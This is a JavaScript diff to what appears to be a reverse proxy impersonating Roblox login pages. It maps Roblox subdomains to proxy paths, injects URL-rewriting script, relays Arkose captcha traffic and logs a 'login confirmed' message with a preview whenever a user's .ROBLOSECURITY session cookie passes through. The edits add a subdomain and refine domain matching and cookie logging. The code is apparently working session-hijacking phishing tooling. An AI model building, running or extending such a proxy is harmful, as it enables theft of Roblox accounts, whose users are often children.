@@ -59,6 +59,7 @@ const SUBDOMAIN_MAP = {
     'client-telemetry': 'https://client-telemetry.roblox.com',
     'ephemeralcounters': 'https://ephemeralcounters.roblox.com',
     'metrics':        'https://metrics.roblox.com',
+    'locale':         'https://locale.roblox.com',
     
     // CRITICAL: rbxcdn.com domains for captcha
     'apis-rbxcdn':    'https://apis.rbxcdn.com',
@@ -408,13 +409,10 @@ function forwardResponse(res, response, host, origin, deviceId) {
     const hasRobloSecurity = (cookies || []).some(c => c.includes('.ROBLOSECURITY'));
     if (hasRobloSecurity) {
         const raw = (cookies || []).find(c => c.includes('.ROBLOSECURITY')) || '';
-        const tokenPart = raw.split(';')[0]; // just the name=value, no attributes
-        const preview = tokenPart.length > 40 ? tokenPart.substring(0, 40) + '...' : tokenPart;
+        const preview = raw.split(';')[0].substring(0, 40) + '...';
         console.log(`✅ .ROBLOSECURITY received — login confirmed! (${preview})`);
-    } else {
-        if (status === 200) {
-            console.log(`⚠️  Login returned 200 but NO .ROBLOSECURITY cookie — silent failure`);
-        }
+    } else if (status === 200) {
+        console.log(`⚠️  Login returned 200 but NO .ROBLOSECURITY — silent failure`);
     }
     
     if (deviceId) {
@@ -467,8 +465,10 @@ function buildInjectedScript(host) {
         ["https://roblox-images.arkoselabs.com", PROXY_HOST + "/arkose-images"],
     ];
     
-    // Combine all domains
-    var ALL_DOMAINS = DOMAIN_MAP.concat(ARKOSE_DOMAINS);
+    // Combine all domains — sort longest-first so specific subdomains match before shorter ones
+    var ALL_DOMAINS = DOMAIN_MAP.concat(ARKOSE_DOMAINS).sort(function(a, b) {
+        return b[0].length - a[0].length;
+    });
     
     function rewriteUrl(url) {
         if (!url || typeof url !== 'string') return url;
@@ -970,8 +970,11 @@ function escapeRegex(str) {
 function rewriteUrls(body, host) {
     let result = body;
     
-    // Rewrite all mapped domains
-    for (const [prefix, target] of Object.entries(SUBDOMAIN_MAP)) {
+    // Sort by target length descending so more specific domains match before shorter ones
+    // e.g. challenge.roblox.com must match before a generic *.roblox.com pattern
+    const entries = Object.entries(SUBDOMAIN_MAP).sort((a, b) => b[1].length - a[1].length);
+    
+    for (const [prefix, target] of entries) {
         const domain = target.replace(/^https?:/, '');
         result = result.replace(new RegExp(`https?:${escapeRegex(domain)}`, 'g'), `https://${host}/${prefix}`);
         result = result.replace(new RegExp(escapeRegex(domain), 'g'), `//${host}/${prefix}`);
